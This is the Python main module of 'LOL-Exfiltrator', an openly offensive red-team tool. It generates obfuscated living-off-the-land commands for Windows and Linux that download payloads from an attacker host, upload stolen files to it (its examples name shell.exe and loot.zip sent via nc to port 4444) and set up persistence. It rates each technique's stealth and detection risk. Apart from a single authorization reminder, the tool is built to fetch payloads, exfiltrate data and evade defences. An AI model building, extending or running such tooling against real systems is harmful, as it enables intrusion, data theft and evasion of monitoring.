#!/usr/bin/env python3
"""
LOL-Exfiltrator v2.0 — Red Team Living Off The Land Command & Obfuscation Generator.
Unified reference for Windows (LOLBAS) and Linux (GTFOBins) techniques.
"""

import argparse
import sys
import os
import logging
from typing import List

log_dir = os.path.expanduser("~/.lol-exfiltrator/")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, "lol_exfiltrator.log")

logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

from commands.registry        import registry
from commands                 import TechniqueEntry
from core.obfuscator          import obfuscate, get_available_techniques
from core.validators          import InputValidator, ValidationError
from core.display             import (
    print_banner, print_section, print_result_header,
    print_clear_command, print_obfuscated_command,
    print_technique, print_stealth_note, print_obf_explanation,
    print_requires, print_divider, print_info, print_warning,
    print_error, print_success, prompt, prompt_choice,
    print_privilege, print_detection_risk,
)

SUPPORTED_OS = ['windows', 'linux']
SUPPORTED_ACTIONS = ['download', 'upload', 'persistence']
DEFAULT_PORT = '8080'


def build_command(template: str, ip: str, port: str, filename: str) -> str:
    """Safely substitutes placeholders in a command template with validation."""
    result = template
    replacements = {
        '{ip}': str(ip).strip(),
        '{port}': str(port).strip(),
        '{filename}': str(filename).strip()
    }
    replaced_count = 0
    for placeholder, value in replacements.items():
        if placeholder in result:
            result = result.replace(placeholder, value)
            replaced_count += 1

    if replaced_count == 0:
        print_warning(f"Template contains no recognized placeholders: {template[:60]}…")

    return result


def get_validated_target(arg_val: str, prompt_msg: str, default: str) -> str:
    """Ensures a valid IP or FQDN target using InputValidator."""
    if arg_val:
        try:
            return InputValidator.validate_target(arg_val)
        except ValidationError as e:
            print_error(str(e))
            sys.exit(1)

    val = prompt(prompt_msg, default)
    while not InputValidator.is_valid_target(val):
        print_warning(f"Invalid target: '{val}'. Please enter a valid IPv4, IPv6, or domain name.")
        val = prompt(prompt_msg, default)
    return val.strip()


def get_validated_port(arg_val: str, prompt_msg: str, default: str = DEFAULT_PORT) -> str:
    """Ensures a valid port number (1 - 65535) using InputValidator."""
    if arg_val:
        try:
            return str(InputValidator.validate_port(arg_val))
        except ValidationError as e:
            print_error(str(e))
            sys.exit(1)

    val = prompt(prompt_msg, default)
    while True:
        try:
            return str(InputValidator.validate_port(val))
        except ValidationError:
            print_warning(f"Invalid port: '{val}'. Must be an integer between 1 and 65535.")
            val = prompt(prompt_msg, default)


def get_validated_filename(arg_val: str, prompt_msg: str, default: str) -> str:
    """Ensures a safe filename across OS targets."""
    if arg_val:
        try:
            return InputValidator.sanitize_filename(arg_val)
        except ValidationError as e:
            print_error(str(e))
            sys.exit(1)

    val = prompt(prompt_msg, default)
    while not InputValidator.is_valid_filename(val):
        print_warning(f"Invalid filename: '{val}'. Cannot contain special injection characters.")
        val = prompt(prompt_msg, default)
    return val.strip()


def run_interactive(args: argparse.Namespace) -> None:
    """Interactive wizard mode for generating clear and obfuscated LOL commands."""
    if not args.quiet:
        print_banner()

    # Step 1: Target OS Selection
    if args.os:
        os_type = args.os.lower()
        if os_type not in SUPPORTED_OS:
            print_error(f"Unsupported OS '{args.os}'. Choose: {', '.join(SUPPORTED_OS)}")
            sys.exit(1)
        if not args.quiet:
            print_info(f"Target OS : {os_type.capitalize()}")
    else:
        print_section("Step 1 › Select Target OS")
        os_type = prompt_choice("Target OS", [o.capitalize() for o in SUPPORTED_OS]).lower()

    # Step 2: Desired Action Selection
    if args.action:
        action = args.action.lower()
        if action not in SUPPORTED_ACTIONS:
            print_error(f"Unsupported action '{args.action}'. Choose: {', '.join(SUPPORTED_ACTIONS)}")
            sys.exit(1)
        if not args.quiet:
            print_info(f"Action    : {action.capitalize()}")
    else:
        print_section("Step 2 › Select Action")
        action = prompt_choice("Desired Action", [a.capitalize() for a in SUPPORTED_ACTIONS]).lower()

    # Step 3: Network & File Parameters
    if action in ('download', 'upload'):
        attacker_ip = get_validated_target(args.ip, "Attacker IP / Hostname", "192.168.1.100")
        attacker_port = get_validated_port(args.port, "Attacker Port", DEFAULT_PORT)
        default_file = "payload.exe" if os_type == "windows" else "payload.elf"
        filename = get_validated_filename(args.filename, "Remote Filename", default_file)
    else:
        attacker_ip = get_validated_target(args.ip, "Callback IP / URL", "192.168.1.100")
        attacker_port = get_validated_port(args.port, "Callback Port", DEFAULT_PORT)
        default_file = "payload.ps1" if os_type == "windows" else "payload.sh"
        filename = get_validated_filename(args.filename, "Payload Filename", default_file)

    # Step 4: Retrieve and Filter Commands
    commands = registry.get_techniques(os_type, action)
    if not commands:
        print_error(f"No techniques found for OS='{os_type}' action='{action}'.")
        sys.exit(1)

    if args.binary:
        filtered = registry.filter_by_binary(os_type, args.binary, action)
        if not filtered:
            available_bins = sorted(set(c.binary for c in commands))
            print_error(
                f"No techniques match binary filter '{args.binary}'. "
                f"Available binaries: {', '.join(available_bins)}"
            )
            sys.exit(1)
        commands = filtered

    # Output Display
    if not args.quiet:
        print_section(
            f"Results  ›  OS: {os_type.capitalize()}  |  Action: {action.capitalize()}  "
            f"|  Target: {attacker_ip}:{attacker_port}/{filename}"
        )
        print_info(f"Found {len(commands)} technique(s). Generating clear + obfuscated commands…\n")

    for idx, cmd_entry in enumerate(commands, start=1):
        clear_cmd = build_command(
            cmd_entry.template,
            attacker_ip, attacker_port, filename
        )

        obf_result = obfuscate(
            command=clear_cmd,
            os_type=os_type,
            binary=cmd_entry.binary,
            ip=attacker_ip,
            technique=args.obf_technique or 'auto',
        )

        if args.quiet:
            # Scripting mode: Print only the ready-to-run obfuscated command
            print(obf_result['obfuscated_command'])
            continue

        print_result_header(idx, cmd_entry.name)
        print_divider()

        print_clear_command(clear_cmd)
        print_stealth_note(cmd_entry.stealth_note)
        print()

        print_obfuscated_command(obf_result['obfuscated_command'])
        print_technique(obf_result['technique_used'])
        print_obf_explanation(obf_result['explanation'])

        logging.info(
            f"Generated command for {os_type} - {action} - {cmd_entry.binary} "
            f"- Obf: {obf_result['technique_used']}"
        )

        if cmd_entry.requires:
            print()
            print_requires(cmd_entry.requires)

        print_privilege(cmd_entry.privilege)
        print_detection_risk(cmd_entry.detection_risk)
        print()

    if not args.quiet:
        print_success("Done. Copy the obfuscated command that best fits your scenario.")
        print_warning("Reminder: Use only on systems you are authorized to test.")


def run_list_mode(args: argparse.Namespace) -> None:
    """Prints a structured catalogue of available techniques with risk and privilege tags."""
    print_banner()

    os_types = [args.os.lower()] if args.os else SUPPORTED_OS
    actions = [args.action.lower()] if args.action else SUPPORTED_ACTIONS

    for os_type in os_types:
        os_label = "Windows (LOLBAS)" if os_type == 'windows' else "Linux (GTFOBins)"

        for action in actions:
            entries = registry.get_techniques(os_type, action)
            if not entries:
                continue
            print_section(f"{os_label}  ›  {action.capitalize()}")
            for i, entry in enumerate(entries, 1):
                risk_icon = {'low': '🟢', 'medium': '🟡', 'high': '🔴'}.get(
                    entry.detection_risk, '⚪'
                )
                print_info(
                    f"{i:2}.  {entry.name}  ({entry.binary})  "
                    f"{risk_icon} {entry.detection_risk}  [{entry.privilege}]"
                )
    print()


def run_search_mode(keyword: str) -> None:
    """Searches across all techniques for keywords."""
    print_banner()
    print_section(f"Search Results for '{keyword}'")

    results = registry.search(keyword)
    if not results:
        print_warning(f"No techniques found matching keyword '{keyword}'.")
        return

    print_info(f"Found {len(results)} matching technique(s):\n")
    for i, entry in enumerate(results, 1):
        risk_icon = {'low': '🟢', 'medium': '🟡', 'high': '🔴'}.get(
            entry.detection_risk, '⚪'
        )
        print_info(
            f"{i:2}. {entry.name} ({entry.binary}) "
            f"{risk_icon} {entry.detection_risk} [{entry.privilege}]"
        )
        print_stealth_note(entry.stealth_note)
        print()


def build_parser() -> argparse.ArgumentParser:
    all_techniques = sorted(get_available_techniques('all').keys())
    technique_choices = ['auto'] + all_techniques

    parser = argparse.ArgumentParser(
        prog='lol-exfiltrator',
        description=(
            'LOL-Exfiltrator v2.0 — Living Off The Land (LOLBAS & GTFOBins) '
            'Ingress, Egress, and Persistence with 21 Obfuscation Methods.'
        ),
        epilog=(
            'Examples:\n'
            '  python lol_exfiltrator.py\n'
            '  python lol_exfiltrator.py --os windows --action download --ip 10.10.10.10 --filename shell.exe\n'
            '  python lol_exfiltrator.py --os linux --action upload --ip 10.0.0.1 --port 4444 --filename loot.zip --binary nc\n'
            '  python lol_exfiltrator.py --search "AppLocker"\n'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target = parser.add_argument_group('Target')
    target.add_argument(
        '--os', '-O',
        choices=['windows', 'linux'],
        type=str.lower,
        metavar='OS',
        help='Target operating system: windows | linux',
    )
    target.add_argument(
        '--action', '-a',
        choices=['download', 'upload', 'persistence'],
        type=str.lower,
        metavar='ACTION',
        help='Technique category: download | upload | persistence',
    )
    target.add_argument(
        '--ip', '-i',
        metavar='ATTACKER_IP',
        help='Attacker IP address or FQDN callback host',
    )
    target.add_argument(
        '--port', '-p',
        metavar='PORT',
        default='',
        help=f'Attacker listening port (default: {DEFAULT_PORT})',
    )
    target.add_argument(
        '--filename', '-f',
        metavar='FILENAME',
        help='Remote filename to transfer or execute',
    )

    filt = parser.add_argument_group('Filtering & Search')
    filt.add_argument(
        '--binary', '-b',
        metavar='BINARY',
        help='Filter results to a specific tool (e.g. certutil, esentutl, nc, socat)',
    )
    filt.add_argument(
        '--search', '-s',
        metavar='KEYWORD',
        help='Search techniques across names, binaries, and stealth notes',
    )

    obf = parser.add_argument_group('Obfuscation')
    obf.add_argument(
        '--obf-technique', '-t',
        dest='obf_technique',
        metavar='TECHNIQUE',
        default='auto',
        choices=technique_choices,
        help=(
            'Obfuscation strategy to apply (default: auto).\n'
            f'  Available: {", ".join(technique_choices)}\n'
        ),
    )

    misc = parser.add_argument_group('Output & Misc')
    misc.add_argument(
        '--list', '-l',
        action='store_true',
        help='Catalogue all available techniques with risk/privilege ratings',
    )
    misc.add_argument(
        '--quiet', '-q',
        action='store_true',
        help='Quiet mode: outputs only the obfuscated command (ideal for scripts/pipes)',
    )
    misc.add_argument(
        '--version', '-v',
        action='version',
        version='%(prog)s 2.0.0',
    )

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    if args.search:
        run_search_mode(args.search)
    elif args.list:
        run_list_mode(args)
    else:
        run_interactive(args)


if __name__ == '__main__':
    main()